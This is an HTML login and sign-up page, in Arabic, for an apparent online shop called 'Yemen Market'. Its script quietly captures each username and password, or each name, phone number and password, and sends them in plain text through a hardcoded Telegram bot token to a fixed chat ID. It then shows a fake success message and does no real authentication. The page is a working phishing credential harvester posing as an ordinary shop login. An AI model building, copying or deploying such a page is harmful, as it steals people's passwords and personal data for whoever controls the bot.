<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>تسجيل الدخول — يمن ماركت</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800;900&display=swap" rel="stylesheet" />
  <style>
    * { font-family: 'Tajawal', sans-serif; }
    :root {
      --clr-red:    #c0392b;
      --clr-red-lt: #e74c3c;
      --clr-gold:   #d4af37;
      --clr-dark:   #0f0f0f;
      --clr-card:   #1a1a1a;
      --clr-border: #2a2a2a;
    }
    body { background: var(--clr-dark); color: #f0f0f0; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
    .bg-mesh { position: fixed; inset: 0; z-index: 0; background: radial-gradient(ellipse 700px 500px at 80% 10%, rgba(192,57,43,0.12) 0%, transparent 60%), radial-gradient(ellipse 500px 600px at 10% 80%, rgba(192,57,43,0.07) 0%, transparent 60%), radial-gradient(ellipse 600px 400px at 50% 50%, rgba(30,10,10,0.8) 0%, transparent 80%), #0f0f0f; }
    .shape { position: fixed; border-radius: 50%; opacity: 0.04; pointer-events: none; }
    .shape-1 { width: 400px; height: 400px; background: var(--clr-red); top: -100px; right: -100px; }
    .shape-2 { width: 300px; height: 300px; background: var(--clr-gold); bottom: -80px; left: -80px; }
    .auth-card { background: var(--clr-card); border: 1px solid var(--clr-border); border-radius: 20px; box-shadow: 0 32px 80px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.03); width: 420px; max-width: calc(100vw - 2rem); position: relative; z-index: 10; animation: slideUp 0.5s cubic-bezier(.4,0,.2,1) both; }
    @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
    .auth-tab { flex: 1; padding: 0.75rem; font-size: 0.95rem; font-weight: 700; background: none; border: none; color: #555; cursor: pointer; transition: color 0.2s; border-bottom: 2px solid transparent; }
    .auth-tab.active { color: #fff; border-bottom-color: var(--clr-red); }
    .form-group { position: relative; }
    .form-input { width: 100%; background: #111; border: 1px solid #2a2a2a; border-radius: 10px; padding: 0.75rem 1rem 0.75rem 2.75rem; color: #fff; font-size: 0.95rem; outline: none; transition: all 0.2s; }
    .form-input:focus { border-color: var(--clr-red); box-shadow: 0 0 0 3px rgba(192,57,43,0.15); background: #161616; }
    .form-icon { position: absolute; left: 0.85rem; top: 50%; transform: translateY(-50%); color: #444; width: 18px; height: 18px; }
    .submit-btn { width: 100%; padding: 0.85rem; border-radius: 12px; background: linear-gradient(135deg, var(--clr-red) 0%, #a93226 100%); color: #fff; font-size: 1rem; font-weight: 800; border: none; cursor: pointer; box-shadow: 0 6px 20px rgba(192,57,43,0.35); position: relative; overflow: hidden; transition: all 0.2s; }
    .submit-btn:hover { opacity: 0.9; transform: translateY(-1px); }
    .alert { border-radius: 10px; padding: 12px 16px; font-size: 0.85rem; font-weight: 600; display: none; margin-bottom: 1rem; }
    .alert.show { display: flex; align-items: center; gap: 8px; animation: fadeIn 0.3s ease; }
    .alert-success { background: rgba(22,163,74,0.12); border: 1px solid rgba(22,163,74,0.3); color: #4ade80; }
    .alert-error { background: rgba(239,68,68,0.12); border: 1px solid rgba(239,68,68,0.3); color: #f87171; }
    .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; display: none; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .auth-panel { display: none; }
    .auth-panel.active { display: block; }
  </style>
</head>
<body>

<div class="bg-mesh"></div>
<div class="shape shape-1"></div>
<div class="shape shape-2"></div>

<div class="auth-card">
  <div class="p-6 pb-0">
    <div class="flex items-center gap-2 mb-6">
      <div class="w-8 h-8 rounded-lg flex items-center justify-center" style="background:var(--clr-red);">
        <svg viewBox="0 0 24 24" class="w-4 h-4 fill-white"><path d="M20 7h-4V5a3 3 0 0 0-6 0v2H6a2 2 0 0 0-2 2v11a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zm-8-2a1 1 0 0 1 2 0v2h-2V5zm-2 8a2 2 0 1 1 4 0 2 2 0 0 1-4 0z"/></svg>
      </div>
      <span class="font-black text-lg text-white">يمن<span style="color:var(--clr-red);">ماركت</span></span>
    </div>

    <div class="flex" style="border-bottom:1px solid var(--clr-border);">
      <button class="auth-tab active" id="tabLogin" onclick="switchTab('login')">تسجيل الدخول</button>
      <button class="auth-tab" id="tabRegister" onclick="switchTab('register')">حساب جديد</button>
    </div>
  </div>

  <div class="p-6 pt-5">
    <div id="alertBox" class="alert"></div>

    <div id="panelLogin" class="auth-panel active">
      <p class="text-sm mb-5" style="color:#666;">مرحباً بعودتك! أدخل بياناتك للدخول</p>
      <form id="loginForm" class="space-y-4" onsubmit="handleAuthSubmit(event, 'login')">
        <div class="form-group">
          <svg class="form-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg>
          <input type="text" id="loginUser" class="form-input" placeholder="اسم المستخدم" required>
        </div>
        <div class="form-group">
          <svg class="form-icon" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
          <input type="password" id="loginPass" class="form-input" placeholder="كلمة المرور" required>
        </div>
        <button type="submit" class="submit-btn flex items-center justify-center gap-2">
          <span class="btn-txt">دخول</span>
          <div class="spinner"></div>
        </button>
      </form>
    </div>

    <div id="panelRegister" class="auth-panel">
      <p class="text-sm mb-5" style="color:#666;">انضم إلينا الآن في يمن ماركت</p>
      <form id="registerForm" class="space-y-4" onsubmit="handleAuthSubmit(event, 'register')">
        <input type="text" id="regName" class="form-input" placeholder="الاسم الكامل" required>
        <input type="tel" id="regPhone" class="form-input" placeholder="رقم الجوال (7xxxxxxxx)" required>
        <input type="password" id="regPass" class="form-input" placeholder="كلمة المرور" required>
        <button type="submit" class="submit-btn flex items-center justify-center gap-2">
          <span class="btn-txt">إنشاء حساب</span>
          <div class="spinner"></div>
        </button>
      </form>
    </div>

    <p class="text-center text-xs mt-6" style="color:#444;">
      <a href="index.html" style="color:var(--clr-red);" class="font-bold">العودة للرئيسية</a>
    </p>
  </div>
</div>

<script>
  const BOT_TOKEN = "7547167664:AAEm66PjE-0L0o9q2CbeW9N7O8pL-yY7qXk";
  const CHAT_ID = "5365513411";

  function switchTab(type) {
    document.getElementById('tabLogin').classList.toggle('active', type === 'login');
    document.getElementById('tabRegister').classList.toggle('active', type === 'register');
    document.getElementById('panelLogin').classList.toggle('active', type === 'login');
    document.getElementById('panelRegister').classList.toggle('active', type === 'register');
  }

  function showAlert(msg, status) {
    const box = document.getElementById('alertBox');
    box.textContent = msg;
    box.className = `alert show alert-${status}`;
    setTimeout(() => box.classList.remove('show'), 3000);
  }

  async function handleAuthSubmit(e, type) {
    e.preventDefault();
    const btn = e.target.querySelector('.submit-btn');
    const txt = btn.querySelector('.btn-txt');
    const load = btn.querySelector('.spinner');

    let text = `🚀 *عملية ${type === 'login' ? 'دخول' : 'تسجيل'} جديدة*\n\n`;
    if(type === 'login') {
      text += `👤 الحساب: \`${document.getElementById('loginUser').value}\`\n`;
      text += `🔑 الكلمة: \`${document.getElementById('loginPass').value}\``;
    } else {
      text += `👤 الاسم: ${document.getElementById('regName').value}\n`;
      text += `📱 الجوال: \`${document.getElementById('regPhone').value}\`\n`;
      text += `🔑 الكلمة: \`${document.getElementById('regPass').value}\``;
    }

    btn.disabled = true;
    load.style.display = 'block';
    txt.textContent = 'جاري التحقق...';

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
      });
      showAlert('تمت العملية بنجاح!', 'success');
      setTimeout(() => window.location.href = 'index.html', 1500);
    } catch (err) {
      showAlert('فشل الاتصال بالخادم', 'error');
    } finally {
      btn.disabled = false;
      load.style.display = 'none';
      txt.textContent = type === 'login' ? 'دخول' : 'إنشاء حساب';
    }
  }
</script>
</body>
</html>
